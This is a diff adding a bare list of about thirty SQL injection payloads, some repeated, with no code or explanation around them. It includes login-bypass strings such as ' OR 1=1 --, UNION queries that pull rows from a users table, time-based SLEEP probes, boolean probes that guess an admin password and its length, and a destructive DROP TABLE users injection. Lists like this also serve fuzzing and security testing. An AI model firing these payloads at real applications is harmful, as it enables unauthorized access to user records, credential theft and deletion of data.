@@ -1,0 +1,30 @@
+' OR 1=1 --
+' UNION SELECT * FROM users --
+' AND 1=SLEEP(5) --
+'); DROP TABLE users; --
+' UNION SELECT * FROM comments WHERE comment LIKE '%<%' --
+' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 --
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password='password')>0 --
+' UNION SELECT * FROM users WHERE username='admin' AND 1633781711=COALESCE((SELECT COUNT(*) FROM information_schema.tables WHERE table_name='useragent'),0) --
+' AND SLEEP(5) --
+' AND 1=1 --
+' UNION SELECT (SELECT COUNT(*) FROM users WHERE username='admin') --
+' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 --
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password='password')>0 AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password='admin')>0 --
+' UNION SELECT * FROM users WHERE username LIKE '%' --
+' UNION SELECT * FROM users WHERE LOWER(username)=LOWER('admin') --
+' UNION SELECT * FROM users WHERE username='admin' --
+' OR 1=1 --
+' UNION SELECT * FROM users WHERE username='admin'--
+' UNION SELECT * FROM users WHERE username='admin' --
+' UNION SELECT * FROM users WHERE username='admin' AND 1633781711=COALESCE((SELECT COUNT(*) FROM information_schema.tables WHERE table_name='useragent'),0) --
+'); DROP TABLE users; --
+' UNION SELECT * FROM comments WHERE comment LIKE '%<%' --
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password='password')>0 --
+' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 --
+' UNION SELECT (SELECT COUNT(*) FROM users WHERE username='admin') --
+' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 --
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password='password')>0 AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password='admin')>0 --
+' UNION SELECT * FROM users WHERE username LIKE '%' --
+' UNION SELECT * FROM users WHERE username='admin' AND password IS NULL --
+' UNION SELECT * FROM users WHERE username='admin' AND LENGTH(password)<10 --
